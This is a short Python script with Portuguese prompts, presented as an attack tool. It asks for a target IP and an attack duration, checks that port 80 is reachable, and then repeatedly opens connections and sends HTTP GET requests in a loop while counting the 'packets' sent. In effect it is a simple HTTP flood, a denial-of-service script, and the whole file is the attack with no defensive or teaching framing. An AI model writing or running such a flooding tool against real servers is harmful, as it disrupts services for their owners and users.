import socket
import time

def test_connection(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip,80))
        return True
    except Exception as e:
        return False
    finally:
        sock.close()

def attack(ip, duration=60):
    start_time = time.time()
    sent = 0
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, 80))
            request = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
            
            sock.sendall(request)
            sent += 1
            print(f"-> Pacote {sent} enviado para {ip}")
            sock.close()
        except KeyboardInterrupt:
            print("\n-> Interrompido pelo usuário")
            break
        except Exception as e:
            print(f"-> Erro ao enviar pacote para {ip}: {e}")
            break
        finally:
            sock.close()

def main():
    ip = input("IP do Alvo: ")
    duration = int(input("Duração do Ataque (Em segundos): "))

    print("== Testando conexão com o alvo ==")
    if(test_connection(ip)):
        print("== Conexão Estabelecida ==")
    else:
        print("== Sem Conexão - O alvo pode estar offline ==")
        return

    print("== Iniciando Ataque ==")
    print("-> Pressione CTRL+C para interromper o ataque antes do fim da duração")
    time.sleep(3)

    try:
        attack(ip, duration)
    except KeyboardInterrupt:
        print("-> Interrompido pelo usuário")
        return

    print("== Ataque Encerrado ==")

if __name__ == "__main__":
    main()
